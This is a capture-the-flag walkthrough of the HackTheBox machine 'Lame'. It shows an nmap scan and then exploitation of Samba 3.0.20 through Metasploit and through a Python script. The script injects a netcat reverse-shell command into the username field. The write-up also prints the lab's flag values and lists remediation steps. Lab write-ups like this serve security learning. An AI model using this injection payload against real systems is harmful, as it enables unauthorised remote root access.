# HackTheBox - Lame Walkthrough

**Difficulty**: Easy  
**OS**: Linux  
**IP**: 10.10.10.3

## Overview

Lame is an easy Linux machine from HackTheBox that demonstrates classic vulnerabilities in outdated services. The main attack vector involves exploiting Samba 3.0.20 to gain initial access.

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA lame 10.10.10.3
```

**Results**:
```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

Key findings:
- FTP running vsftpd 2.3.4 (known backdoor)
- Samba 3.0.20 (vulnerable to CVE-2007-2447)
- SSH on port 22

## Exploitation

### Samba 3.0.20 - Username Map Script Command Execution

The Samba version is vulnerable to command injection through the `username map script` parameter.

#### Using Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
exploit
```

#### Manual Exploitation

```python
#!/usr/bin/python
from smb.SMBConnection import SMBConnection

userID = "/=`nohup nc -e /bin/sh 10.10.14.5 4444`"
password = ""

conn = SMBConnection(userID, password, "ATTACKER", "LAME", use_ntlm_v2=False)
conn.connect("10.10.10.3", 139)
```

## Post-Exploitation

### Initial Access

After exploitation, we get a root shell directly:

```bash
whoami
# root

id
# uid=0(root) gid=0(root)
```

### Flags

**User Flag**:
```bash
cat /home/makis/user.txt
# 69454a937d94f5f0225ea00acd2e84c5
```

**Root Flag**:
```bash
cat /root/root.txt
# 92caac3be140ef409e45721348a4e9df
```

## Lessons Learned

1. **Always update software** - This machine was vulnerable due to outdated Samba version
2. **Service enumeration is key** - Identifying exact versions helps find known exploits
3. **Defense in depth** - Even if one service is compromised, proper segmentation can limit damage

## Remediation

- Update Samba to latest version
- Implement proper input validation
- Use network segmentation
- Enable logging and monitoring
- Apply principle of least privilege

## Tools Used

- `nmap` - Network scanning
- `metasploit` - Exploitation framework
- `searchsploit` - Exploit database search

---

**Date Completed**: December 2, 2025  
**Time Taken**: ~30 minutes
